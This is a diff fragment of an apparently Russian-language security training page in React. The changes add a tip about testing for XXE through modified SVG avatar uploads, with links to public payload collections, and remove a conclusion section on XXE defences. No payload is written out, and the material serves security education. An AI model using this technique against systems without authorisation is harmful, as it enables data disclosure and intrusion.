+                >
+                  Exploiting XXE via image file upload <ExternalLink className="ml-1 h-3 w-3" />
+                </a>
+              </li>
+            </ol>
+            <P className="mt-4">
+              И совет из личного опыта – если фича загрузки аватарки поддерживает <strong>SVG</strong>, не забывать 
+              покрывать вектор <strong>XXE через аплоад модифицированного изображения</strong>. Пример{' '}
+              <a 
+                href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection/Files"
+                target="_blank"
+                rel="noopener noreferrer"
+                className="text-primary hover:underline inline-flex items-center"
+              >
+                можно взять тут <ExternalLink className="ml-1 h-3 w-3" />
+              </a>
+              .
+            </P>
+            <P>
+              Также, возможно, если приложение не позволяет загрузить через фронт <strong>SVG</strong> формат, то 
+              возможно через <strong>Repeater</strong> это получится. Но об этом рассмотрим во время{' '}
+              <strong>File Upload vulnerabilities.</strong>
+            </P>
           </CardContent>
         </Card>
 
@@ -637,27 +437,6 @@ using (XmlReader reader = XmlReader.Create(stream, settings))
                 />
               ))}
             </div>
-          </CardContent>
-        </Card>
-
-        <Card className="bg-primary/5 border-primary/20">
-          <CardHeader>
-            <CardTitle>Заключение</CardTitle>
-          </CardHeader>
-          <CardContent>
-            <P>
-              XXE (XML External Entity) — серьезная уязвимость, которая может привести к раскрытию конфиденциальных 
-              данных, SSRF атакам и другим серьезным последствиям. <strong>Лучшая защита — полностью отключить 
-              обработку внешних сущностей</strong> в XML парсере.
-            </P>
-            <P>
-              Если ваше приложение обрабатывает XML, убедитесь, что вы используете безопасную конфигурацию парсера. 
-              Везде, где возможно, рассмотрите использование более простых форматов данных, таких как JSON.
-            </P>
-            <P>
-              <strong>Помните:</strong> Всегда применяйте принцип defense in depth и регулярно обновляйте 
-              зависимости!
-            </P>
           </CardContent>
         </Card>
       </div>
